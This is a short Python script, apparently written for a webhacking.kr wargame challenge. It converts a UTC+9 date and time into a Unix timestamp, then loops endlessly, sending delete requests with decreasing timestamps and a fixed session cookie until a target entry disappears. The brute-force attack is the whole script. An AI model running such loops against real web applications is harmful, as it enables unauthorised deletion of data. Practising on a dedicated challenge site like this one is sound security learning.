import requests
import time
from datetime import datetime, timezone, timedelta

DELTA_TIME = 86400
# The expected timestamp
expected_timestamp = 1728772974

# Convert the timestamp back to a datetime to confirm the date and time in UTC
utc_plus_9 = timezone(timedelta(hours=9))

# Now define the specific date and time, assuming the time is in UTC+9
time_str = "14:37:46"
# Set the specific date in UTC+9
specific_date = datetime(2024, 10, 13, tzinfo=utc_plus_9)

# Parse the time
time_part = datetime.strptime(time_str, "%H:%M:%S").time()

# Combine the specific date with the parsed time and set timezone to UTC+9
dt_combined = datetime.combine(specific_date.date(), time_part, tzinfo=utc_plus_9)

# Convert the combined datetime object back to a Unix timestamp in UTC
timestamp = int(dt_combined.timestamp())



# 1728654584

URL = "http://webhacking.kr:10006/"
SESSION_ID = "1234"
cookies = {'PHPSESSID':SESSION_ID}
params ={'mode':'del', 'time':''}
i = 0
while True:
    params['time'] = str(timestamp)
    timestamp -= DELTA_TIME
    response = requests.post(URL, params=params, cookies=cookies)
    if time_str in response.text:
        print(f"hasn't been deleted yet: {time_str}") 
    print(f"{i} days ago, timestamp is {timestamp}")
    i+=1
